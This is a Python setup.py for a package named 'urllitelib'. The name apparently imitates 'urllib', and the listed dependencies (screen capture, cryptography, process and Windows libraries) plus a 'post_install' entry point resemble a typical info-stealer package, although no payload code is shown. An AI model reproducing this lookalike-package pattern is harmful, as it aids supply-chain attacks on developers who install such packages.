from setuptools import setup
from setuptools.command.install import install

setup(
    name='urllitelib',
    version='1.0.0',
    description='Automatic proxy migration.',
    author='Pain',
    author_email='benjaminrodriguezshhh@proton.me',
    packages=['urllitelib'],
    install_requires=[
        "requests",
        "pyautogui",
        "pycryptodome",
        "pywin32-ctypes",
        "psutil",
    ],
    entry_points={
        'console_scripts': [
            'mi_script = urllitelib.post_install:main'
        ]
    },
)